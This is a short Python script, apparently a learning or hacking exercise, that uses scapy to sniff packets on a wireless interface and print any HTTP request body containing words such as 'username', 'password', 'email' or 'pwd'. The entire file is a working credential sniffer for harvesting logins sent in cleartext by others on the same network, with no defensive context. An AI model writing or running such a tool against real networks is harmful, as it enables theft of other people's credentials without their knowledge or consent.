#!/usr/bin/sudo python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    keywords = ['username', 'user', 'login', 'password', 'pass', 'email', 'log', 'pwd']
    if packet.haslayer(http.HTTPRequest) and packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        for keyword in keywords:
            if keyword in str(load):
                print(load)
                break


if __name__ == '__main__':
    # sniff("wlp0s20f3")
    sniff("wlp0s20f3")
